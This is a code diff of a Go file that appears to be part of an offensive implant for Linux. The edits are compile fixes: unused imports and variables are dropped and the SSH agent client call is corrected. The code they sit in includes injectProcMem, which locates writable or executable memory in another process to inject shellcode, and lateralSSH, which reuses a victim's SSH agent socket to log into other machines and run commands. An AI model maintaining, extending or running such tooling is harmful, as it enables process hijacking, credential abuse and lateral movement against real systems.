@@ -5,9 +5,7 @@ package main
 
 import (
 	"bytes"
-	"encoding/base64"
 	"encoding/binary"
-	"encoding/json"
 	"errors"
 	"fmt"
 	"image"
@@ -18,7 +16,6 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"runtime"
 	"strconv"
 	"strings"
 	"sync/atomic"
@@ -27,7 +24,7 @@ import (
 	"unsafe"
 
 	"golang.org/x/crypto/ssh"
-	"golang.org/x/crypto/ssh/agent"
+	sshagent "golang.org/x/crypto/ssh/agent"
 )
 
 // Linux platform implementations.
@@ -583,7 +580,6 @@ func injectProcMem(pid int, shellcode []byte) error {
 	}
 
 	var targetAddr uint64
-	var targetLen uint64
 	for _, line := range strings.Split(string(mapsData), "\n") {
 		// Look for rwxp or rw-p (writable region)
 		parts := strings.Fields(line)
@@ -607,7 +603,6 @@ func injectProcMem(pid int, shellcode []byte) error {
 		regionLen := endAddr - startAddr
 		if regionLen >= uint64(len(shellcode)) {
 			targetAddr = startAddr
-			targetLen = regionLen
 			if strings.Contains(perms, "x") {
 				// Prefer executable region
 				break
@@ -743,7 +738,7 @@ func lateralSSH(target, user, pass, cmd string) (string, error) {
 	if sock := os.Getenv("SSH_AUTH_SOCK"); sock != "" {
 		agentConn, err := net.Dial("unix", sock)
 		if err == nil {
-			agentClient := sshagent.New(agentConn)
+			agentClient := sshagent.NewClient(agentConn)
 			authMethods = append(authMethods, ssh.PublicKeysCallback(agentClient.Signers))
 		}
 	}
